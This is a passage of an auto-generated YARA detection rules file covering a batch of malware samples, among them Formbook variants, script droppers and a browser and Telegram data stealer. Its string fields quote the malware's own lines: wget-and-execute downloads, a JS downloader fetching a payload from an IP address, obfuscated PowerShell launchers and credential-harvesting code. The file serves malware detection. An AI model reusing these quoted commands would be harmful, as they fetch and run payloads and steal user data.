      $s9 = "        login_data = get_login_data(browser_path, \"Default\", master_key)" fullword ascii /* score: '18.00'*/
      $s10 = "ip_address = requests.get('https://api.ipify.org').text" fullword ascii /* score: '18.00'*/
      $s11 = "    cursor.execute('SELECT url, title, last_visit_time FROM urls')" fullword ascii /* score: '17.00'*/
      $s12 = "    cursor.execute(" fullword ascii /* score: '17.00'*/
      $s13 = "has_telegram = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'))" fullword ascii /* score: '16.00'*/
      $s14 = "            tdata_dir = user + \"\\\\AppData\\\\Roaming\\\\Telegram Desktop\\\\tdata\"" fullword ascii /* score: '16.00'*/
      $s15 = "    os.remove(user+'\\\\AppData\\\\Local\\\\Temp\\\\login_db')" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6d69 and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule eee2f8d7ba00929c593fe4a4507bf06245456bf472eb46439514b29428647092_eee2f8d7 {
   meta:
      description = "_subset_batch - file eee2f8d7ba00929c593fe4a4507bf06245456bf472eb46439514b29428647092_eee2f8d7.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "eee2f8d7ba00929c593fe4a4507bf06245456bf472eb46439514b29428647092"
   strings:
      $s1 = "        var forlest = artocarpad.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '17.00'*/
      $s2 = "        var Gauss = artocarpad.Get(\"Win32_Process\");" fullword ascii /* score: '14.00'*/
      $s3 = "cenniumodecenniumJdecennium2decenniumhdecennium0decenniumddecenniumHdecenniumBdecenniumzdecenniumOdecenniumidecennium8decenniumv" ascii /* score: '11.00'*/
      $s4 = "ium1decenniumsdecenniumxdecenniumXdecenniumTdecenniumsdecenniumkdecenniumYdecenniumXdecenniumNdecenniumzdecenniumZdecenniumWdece" ascii /* score: '11.00'*/
      $s5 = "nnium1decenniumidecenniumbdecenniumHdecenniumkdecenniumgdecenniumPdecenniumSdecenniumBdecenniumbdecenniumUdecenniummdecenniumVde" ascii /* score: '11.00'*/
      $s6 = "mZdecenniumSdecenniumcdecenniumsdecenniumJdecennium2decenniumFdecenniumwdecenniumcdecenniumGdecenniumldecenniumkdecenniumddecenn" ascii /* score: '11.00'*/
      $s7 = "nniumNdecennium0decenniumYdecenniumXdecenniumJdecennium0decenniumLdecenniumSdecenniumgdecenniumudecenniumKdecenniumjdecennium8de" ascii /* score: '11.00'*/
      $s8 = "mRdecennium2decenniumVdecennium1decenniumQdecenniumVdecenniumhdecenniumkdecenniumddecenniumkdecenniumodecenniumzdecenniumWdecenn" ascii /* score: '11.00'*/
      $s9 = "decenniumcdecennium3decenniumNdecenniumldecenniumbdecenniumWdecenniumJdecenniumsdecenniumedecenniumVdecennium0decennium6decenniu" ascii /* score: '11.00'*/
      $s10 = "nnium9decenniumtdecenniumQdecenniummdecenniumFdecenniumzdecenniumZdecenniumTdecenniumYdecennium0decenniumUdecennium3decenniumRde" ascii /* score: '11.00'*/
      $s11 = "mOdecenniumkdecenniumxdecenniumvdecenniumYdecenniumWdecenniumQdecenniumodecenniumWdecennium0decenniumNdecenniumvdecenniumbdecenn" ascii /* score: '11.00'*/
      $s12 = "mZdecenniumXdecenniumRdecenniumodecenniumbdecennium2decenniumQdecenniumodecenniumJdecennium1decenniumZdecenniumBdecenniumSdecenn" ascii /* score: '11.00'*/
      $s13 = "iumWdecennium5decenniumjdecenniumbdecennium2decenniumRdecenniumpdecenniumbdecenniummdecenniumcdecenniumgdecenniumPdecenniumSdece" ascii /* score: '11.00'*/
      $s14 = "decenniumddecenniumHdecenniumldecenniumwdecenniumZdecenniumSdecennium5decenniumHdecenniumZdecenniumXdecenniumRdecenniumNdecenniu" ascii /* score: '11.00'*/
      $s15 = "cenniumydecenniumadecenniumWdecennium5decenniumndecenniumKdecenniumCdecenniumRdecennium2decenniumYdecenniumWdecenniumxdecenniumv" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 30KB and
      8 of them
}

rule ef1f467d0f85fa39385600fbb4b7f94f579a3a90f4e63032341f7545d985235b_ef1f467d {
   meta:
      description = "_subset_batch - file ef1f467d0f85fa39385600fbb4b7f94f579a3a90f4e63032341f7545d985235b_ef1f467d.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ef1f467d0f85fa39385600fbb4b7f94f579a3a90f4e63032341f7545d985235b"
   strings:
      $s1 = "jjjjjk" fullword ascii /* reversed goodware string 'kjjjjj' */ /* score: '15.00'*/
      $s2 = "DOuzEYE" fullword ascii /* score: '9.00'*/
      $s3 = "nnnnnnnnnnnno" fullword ascii /* score: '8.00'*/
      $s4 = "ssssssssssssssssssssss" fullword ascii /* score: '8.00'*/
      $s5 = "nnnnnun" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 3000KB and
      all of them
}

rule ef2d3087618d6b1294453f8f74607f4384323282eb91a07f235a8ed675dc800f_ef2d3087 {
   meta:
      description = "_subset_batch - file ef2d3087618d6b1294453f8f74607f4384323282eb91a07f235a8ed675dc800f_ef2d3087.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ef2d3087618d6b1294453f8f74607f4384323282eb91a07f235a8ed675dc800f"
   strings:
      $x1 = "    var filepath = WshShell.ExpandEnvironmentStrings(\"%TEMP%\") + \"/Downloader.exe\";" fullword ascii /* score: '35.00'*/
      $s2 = "var url = \"http://85.114.171.235/Photo.scr\"" fullword ascii /* score: '19.00'*/
      $s3 = "var shell = WScript.CreateObject(\"WScript.Shell\")" fullword ascii /* score: '15.00'*/
      $s4 = "// Name       : JS Downloader" fullword ascii /* score: '14.00'*/
      $s5 = "xhr.open(\"GET\", url, false)" fullword ascii /* score: '12.00'*/
      $s6 = "var WshShell = WScript.CreateObject(\"WScript.Shell\");" fullword ascii /* score: '12.00'*/
      $s7 = "var fso = new ActiveXObject(\"Scripting.FileSystemObject\")" fullword ascii /* score: '10.00'*/
      $s8 = "    shell.Run(filepath)" fullword ascii /* score: '10.00'*/
      $s9 = "// Contact    : https://github.com/NYAN-x-CAT" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x2020 and filesize < 2KB and
      1 of ($x*) and all of them
}

rule Formbook_signature__21371b611d91188d602926b15db6bd48_imphash_ {
   meta:
      description = "_subset_batch - file Formbook(signature)_21371b611d91188d602926b15db6bd48(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "10fe23a76875727b473cf13c70a08596bd5d1c9bf9e571b16775e27229802c22"
   strings:
      $s1 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s2 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s3 = "psspucw" fullword ascii /* score: '8.00'*/
      $s4 = "vrrxwvov" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule Formbook_signature__21371b611d91188d602926b15db6bd48_imphash__04192a8b {
   meta:
      description = "_subset_batch - file Formbook(signature)_21371b611d91188d602926b15db6bd48(imphash)_04192a8b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "04192a8beaa2f78a1c4ab5764134930e49fe58b202f7ea99a2421809a12acee2"
   strings:
      $s1 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s2 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s3 = "psspucw" fullword ascii /* score: '8.00'*/
      $s4 = "vrrxwvov" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule Formbook_signature__21371b611d91188d602926b15db6bd48_imphash__a0f03b78 {
   meta:
      description = "_subset_batch - file Formbook(signature)_21371b611d91188d602926b15db6bd48(imphash)_a0f03b78.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a0f03b781a6132d96dd86b61922cb734aa80b135d2e1551d45496117eb7d1b65"
   strings:
      $s1 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s2 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s3 = "psspucw" fullword ascii /* score: '8.00'*/
      $s4 = "vrrxwvov" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule Formbook_signature__21371b611d91188d602926b15db6bd48_imphash__a3701fb1 {
   meta:
      description = "_subset_batch - file Formbook(signature)_21371b611d91188d602926b15db6bd48(imphash)_a3701fb1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a3701fb120b8bf03636784197b6584ed43b3a18215b27b4c8d85b0ee5f415bf7"
   strings:
      $s1 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s2 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s3 = "psspucw" fullword ascii /* score: '8.00'*/
      $s4 = "vrrxwvov" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule Formbook_signature__21371b611d91188d602926b15db6bd48_imphash__a422d6ce {
   meta:
      description = "_subset_batch - file Formbook(signature)_21371b611d91188d602926b15db6bd48(imphash)_a422d6ce.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a422d6ce2f3c8376411decfba73a28fbaaed1eefd5ce12d4d6f62afb3d03915b"
   strings:
      $s1 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s2 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s3 = "FGyAeyE" fullword ascii /* score: '9.00'*/
      $s4 = "psspucw" fullword ascii /* score: '8.00'*/
      $s5 = "vrrxwvov" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule Formbook_signature__21371b611d91188d602926b15db6bd48_imphash__d68774cf {
   meta:
      description = "_subset_batch - file Formbook(signature)_21371b611d91188d602926b15db6bd48(imphash)_d68774cf.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d68774cf28e7f7a8a574c3b983a339c0bd77810dc9874e90810ccf13739efbdc"
   strings:
      $s1 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s2 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s3 = "psspucw" fullword ascii /* score: '8.00'*/
      $s4 = "vrrxwvov" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule Formbook_signature__21371b611d91188d602926b15db6bd48_imphash__e8ac0f1c {
   meta:
      description = "_subset_batch - file Formbook(signature)_21371b611d91188d602926b15db6bd48(imphash)_e8ac0f1c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e8ac0f1c567b0f90ebd42d248f3b9aad0afe8c0e2ee927b5a1cec88fa61eda56"
   strings:
      $s1 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s2 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s3 = "psspucw" fullword ascii /* score: '8.00'*/
      $s4 = "vrrxwvov" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule Formbook_signature__21371b611d91188d602926b15db6bd48_imphash__f911f79f {
   meta:
      description = "_subset_batch - file Formbook(signature)_21371b611d91188d602926b15db6bd48(imphash)_f911f79f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f911f79f6ccaeb8891449b839a13d1775f210183778c25c77787db52bf638cfb"
   strings:
      $s1 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s2 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s3 = "psspucw" fullword ascii /* score: '8.00'*/
      $s4 = "vrrxwvov" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule f141a4a5f8d6c94e70de51903587266aa11af93a269d0fd6837a9756839e5765_f141a4a5 {
   meta:
      description = "_subset_batch - file f141a4a5f8d6c94e70de51903587266aa11af93a269d0fd6837a9756839e5765_f141a4a5.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f141a4a5f8d6c94e70de51903587266aa11af93a269d0fd6837a9756839e5765"
   strings:
      $s1 = "* \"pA[" fullword ascii /* score: '9.00'*/
      $s2 = "7!??7(@`=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'w' */
      $s3 = "KlYb- P,(X" fullword ascii /* score: '8.00'*/
      $s4 = "pppppxr" fullword ascii /* score: '8.00'*/
      $s5 = "ucEZ* U" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 2000KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6898906a {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6898906a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6898906ac19ea005c0a4868015e5b0039f81de9aee17e5a95e0ec91fd3012464"
   strings:
      $x1 = "\" -ExecutionPolicy Bypass" fullword wide /* score: '31.00'*/
      $s2 = "' -NetworkCategory Private\" -ExecutionPolicy Bypass" fullword wide /* score: '30.00'*/
      $s3 = "-Command \"Set-NetConnectionProfile -InterfaceAlias '" fullword wide /* score: '23.00'*/
      $s4 = "RDPSetup.exe" fullword wide /* score: '22.00'*/
      $s5 = "SELECT Name FROM Win32_Process WHERE Name LIKE '%.exe'" fullword wide /* score: '22.00'*/
      $s6 = "https://icanhazip.com" fullword wide /* score: '17.00'*/
      $s7 = "http://ip-api.com/json/" fullword wide /* score: '17.00'*/
      $s8 = "Get-NetConnectionProfile | Select-Object -ExpandProperty InterfaceAlias" fullword wide /* score: '16.00'*/
      $s9 = "-Command \"" fullword wide /* score: '16.00'*/
      $s10 = " \"Remote Desktop Users\"" fullword wide /* score: '15.00'*/
      $s11 = "SELECT Name FROM Win32_Processor" fullword wide /* score: '15.00'*/
      $s12 = "powershell" fullword wide /* score: '13.00'*/
      $s13 = "Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"" fullword wide /* score: '12.00'*/
      $s14 = "SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem" fullword wide /* score: '12.00'*/
      $s15 = "localgroup \"Remote Desktop Users\" " fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule f3122d8f025219a05665e1bcb5892b91b55212709de214be2371e570eaef0981_f3122d8f {
   meta:
      description = "_subset_batch - file f3122d8f025219a05665e1bcb5892b91b55212709de214be2371e570eaef0981_f3122d8f.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f3122d8f025219a05665e1bcb5892b91b55212709de214be2371e570eaef0981"
   strings:
      $s1 = "wget http://$IP/arm5;chmod 777 arm5;./arm5 tdvr.arm5;rm -rf arm5;" fullword ascii /* score: '19.00'*/
      $s2 = "wget http://$IP/arm7;chmod 777 arm7;./arm7 tdvr.arm7;rm -rf arm7;" fullword ascii /* score: '19.00'*/
      $s3 = "wget http://$IP/arm6;chmod 777 arm6;./arm6 tdvr.arm6;rm -rf arm6;" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x5049 and filesize < 1KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3a083796 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3a083796.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3a0837968763ae731f3b6392a385781f3ea74b0ddab2dd8f23cca3bce2d90359"
   strings:
      $s1 = "PCcPvVrqjf.exe" fullword ascii /* score: '22.00'*/
      $s2 = "SampleApp.exe" fullword wide /* score: '22.00'*/
      $s3 = ".NETFramework,Version=v4.8" fullword ascii /* score: '10.00'*/
      $s4 = ".NET Framework 4.8" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__234c8441 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_234c8441.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "234c8441e67518c24bca7932dc0642ac9c050e5164db777262cf26187e5e65b9"
   strings:
      $s1 = "Nocsrhqa.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__07428a8a {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_07428a8a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "07428a8a84675d7c2e876c503f08737e01d05c82d153fa8d073e8b48058e975e"
   strings:
      $s1 = "* t%t58>" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__098d2c38 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_098d2c38.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "098d2c38e7d949798ba2f7c14593ac83b60771c2dd0b06b48283d82aee186acb"
   strings:
      $s1 = "* Ge1?8p" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      all of them
}

rule Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__32bf8789 {
   meta:
      description = "_subset_batch - file Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_32bf8789.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "32bf87898ff84d6d3fa87b5ae556fbb60da886b2fbc7019f53829feaea5d66e7"
   strings:
      $s1 = "Puhznipvd.exe" fullword wide /* score: '22.00'*/
      $s2 = "ExecuteHiddenTask" fullword ascii /* score: '18.00'*/
      $s3 = "ExecuteInternalTask" fullword ascii /* score: '18.00'*/
      $s4 = "ExecuteResponsiveTask" fullword ascii /* score: '18.00'*/
      $s5 = "EncryptRandomDecryptor" fullword ascii /* score: '16.00'*/
      $s6 = "AdvancedDecryptor" fullword ascii /* score: '11.00'*/
      $s7 = "Puhznipvd.Services" fullword ascii /* score: '10.00'*/
      $s8 = "ManageTask" fullword ascii /* score: '9.00'*/
      $s9 = "get_Sgsrekwqn" fullword ascii /* score: '9.00'*/
      $s10 = "* 4XV4*" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__28e0148a {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_28e0148a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "28e0148a5ddb1aa4217032b8a3edc39b368db534cb430e22b0dc6ce924515bed"
   strings:
      $s1 = "* b\"((8" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d593ddbf {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d593ddbf.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d593ddbfe63dbf2b738f9a64619fbb720fab9f79facdeedc24b2c6960121b1a4"
   strings:
      $s1 = "smilebuildcry.exe" fullword wide /* score: '22.00'*/
      $s2 = "smilebuildcry.Templating" fullword ascii /* score: '14.00'*/
      $s3 = "TemplateServer" fullword ascii /* score: '11.00'*/
      $s4 = "CustomizableTemplate" fullword ascii /* score: '11.00'*/
      $s5 = "GenerateStaticTemplate" fullword ascii /* score: '11.00'*/
      $s6 = "DirectTemplate" fullword ascii /* score: '11.00'*/
      $s7 = "UpdateTemplate" fullword ascii /* score: '11.00'*/
      $s8 = "_ResponsiveTemplate" fullword ascii /* score: '11.00'*/
      $s9 = "Yotcqich.DataStructures" fullword ascii /* score: '11.00'*/
      $s10 = "get_Djhsrwus" fullword ascii /* score: '9.00'*/
      $s11 = "InvokeTree" fullword ascii /* score: '8.00'*/
      $s12 = "smilebuildcry" fullword wide /* score: '8.00'*/
      $s13 = "lnyrcfwa" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7950cbb8 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7950cbb8.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7950cbb81499679e3c679659c045cba5ef5ad482ebe8c74fb36e9c639abd5c6a"
   strings:
      $s1 = " LOgIZa8" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7b740e41 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7b740e41.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7b740e41da45ec7b15c14f520aa55e042010b563b10e52b6cb37fbbb2ca154bb"
   strings:
      $s1 = "* 0fTC8J" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__837bc7d4 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_837bc7d4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "837bc7d4ff9bd5827be40d3beda9557ffaf120dbd4060c1c7a3cb1419f6e652e"
   strings:
      $s1 = "* xD5m8" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__b0c6b451 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b0c6b451.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b0c6b4518f8b0d43dc81a86796ba95738be8c928781f28e389b37465802f0325"
   strings:
      $s1 = "* 87}.8" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c8558a10 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c8558a10.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c8558a10181865122d7aaf808bf85442bcf6fe40772092445756194ab98b20e2"
   strings:
      $s1 = "{$* -*\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e6a19e66 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e6a19e66.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e6a19e660e76e75530cf1d77688884fdf131270135515a6e14378261feb5c62c"
   strings:
      $s1 = "& Bbbg -t" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      all of them
}

rule f4e4732f87598851627929b487f80c9d5e37734badb8eb78d0ee47071b9ae99e_f4e4732f {
   meta:
      description = "_subset_batch - file f4e4732f87598851627929b487f80c9d5e37734badb8eb78d0ee47071b9ae99e_f4e4732f.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f4e4732f87598851627929b487f80c9d5e37734badb8eb78d0ee47071b9ae99e"
   strings:
      $x1 = "Avuncu.ShellExecute(\"explorer.exe\",Yeastedma252 + \"\\system32\\MRT.exe\",\"\",\"open\",0);" fullword ascii /* score: '37.00'*/
      $s2 = "//Systers nonstarch? salably unwaivering puget; temperamaleriers? paakrslen tindens129 phytosterol: sigtelinies, socialpdagogen " ascii /* score: '27.00'*/
      $s3 = "//Skriveskriftens stamkafyq pewy: pilgrimize. rafraichisseur, contradistinctly220: velsers salgsindsatsen provenient! hovedprogr" ascii /* score: '25.00'*/
      $s4 = "//skarnspanden; kateterets ballades? coumarin tbrudsskadens offer prettyism. withstand: efterkommelsesfristernes bisiliac nonapo" ascii /* score: '25.00'*/
      $s5 = "Dekalitret.Item(0).Document.Application.ShellExecute(Cladosela,String.fromCharCode(34)+sport+String.fromCharCode(34),\"\",\"open" ascii /* score: '24.00'*/
      $s6 = "//Blendure, uskadelighedens; vrdipapircentralerne! byrom unvagrantly. chastines skrmmeddelelsers, roughishly penibel: gennemarbe" ascii /* score: '24.00'*/
      $s7 = "Dekalitret.Item(0).Document.Application.ShellExecute(Cladosela,String.fromCharCode(34)+sport+String.fromCharCode(34),\"\",\"open" ascii /* score: '24.00'*/
      $s8 = "//Efteraarsfarvers, forladtheds indgriben laryngostenosis. chirurgical: forbrugerbevidst, eneid. smaskene rygerkupeens underprio" ascii /* score: '23.00'*/
      $s9 = "Cladosela = Yeastedma252 + '\\\\system32\\\\WindowsPower'+Lanxg+'hell\\\\v1.0\\\\power'+Lanxg+'hell.exe';" fullword ascii /* score: '23.00'*/
      $s10 = "sport = \"$Veggied=$env:appdata+'\\\\Haloavers53';$Uneatenv=(Get-Item $Veggied).OpenText().ReadToEnd();$Damnifyi=$Uneatenv[4300." ascii /* score: '21.00'*/
      $s11 = "//Pkge kunstnerens, klatret! pipy? dykkede paganalian228 albylernes193! hnsefoder? myndes. grants tricentennials elevates gests:" ascii /* score: '21.00'*/
      $s12 = "//Udstrningers! attemptability logget? proselyter essayers! amphicarpium, vokalisering? unsimulative garroted241, morigerously10" ascii /* score: '20.00'*/
      $s13 = "//Mikaellas? reechoes: spurvs pirlie beskringer! blameret43! wolfian tringens! stenotypy rugdrys184 metrician egennavnets: calca" ascii /* score: '20.00'*/
      $s14 = "auts relationsoperatorens gravmlets; socialstyrelse isospondyli! afsendelsesprioriteringers skruebrkker bypass! jarnes driftssik" ascii /* score: '20.00'*/
      $s15 = "//bemidlede; handkerchiefs: suggestivt. mana69 styringskort; kemofiber249! statsmagters! infraoral203? beskrersakse! acronymize," ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule f547d29aac0352684d8f78fb3f8139bdf1dd54f4d7d4cb3793d2d7c298e67e64_f547d29a {
   meta:
      description = "_subset_batch - file f547d29aac0352684d8f78fb3f8139bdf1dd54f4d7d4cb3793d2d7c298e67e64_f547d29a.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f547d29aac0352684d8f78fb3f8139bdf1dd54f4d7d4cb3793d2d7c298e67e64"
   strings:
      $s1 = "execute(\"\" & gshxsjjrtrmptaib & \".Run \"\"powershell.exe \" & hwckmgungojsedjt & \"\"\", 0, false\")" fullword wide /* score: '21.00'*/
      $s2 = "execute( \"set \" & gshxsjjrtrmptaib & \" = CreateObject(\"\"WScript.Shell\"\")\" )" fullword wide /* score: '17.00'*/
      $s3 = "Cvfrgbhj.Run Oliportfv, lUato , TAiHD" fullword wide /* score: '16.00'*/
      $s4 = "TnOj = Cvfrgbhj.ExpandEnvironmentStrings(\"%TEMP%\")" fullword wide /* score: '15.00'*/
      $s5 = "GonLG = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s6 = "Cvfrgbhj.Run kxDKx , lUato , TAiHD" fullword wide /* score: '13.00'*/
      $s7 = "Set Cvfrgbhj = CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
      $s8 = "hwckmgungojsedjt = hwckmgungojsedjt & \";$Yolopolhggobek = [system.Text.Encoding]::Unicode.GetString($IgvVM);\"" fullword wide /* score: '12.00'*/
      $s9 = "hwckmgungojsedjt = hwckmgungojsedjt & \";$Yolopolhggobek = ($Yolopolhggobek -replace '%fOyRe%', '\" & GonLG.replace(\"\\\",\"$\"" wide /* score: '12.00'*/
      $s10 = "hwckmgungojsedjt = hwckmgungojsedjt & \";$IgvVM = [system.Convert]::FromBase64String( $MgOrq );\"" fullword wide /* score: '11.00'*/
      $s11 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" fullword wide /* score: '10.00'*/
      $s12 = "hwckmgungojsedjt = hwckmgungojsedjt & \";powershell $Yolopolhggobek;\"" fullword wide /* score: '9.00'*/
      $s13 = "kxDKx = \"scht\" & \"asks /del\" & \"ete /tn \" & SAbles & \" /f\"" fullword wide /* score: '8.00'*/
      $s14 = "hwckmgungojsedjt = hwckmgungojsedjt & \";$MgOrq = ($IuJUJJZz -replace '" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 10000KB and
      8 of them
}

rule f54de135f77d9dd2b7cb96f3279b6eba1f9bf6ef1ac59e7363a0210101a3e613_f54de135 {
   meta:
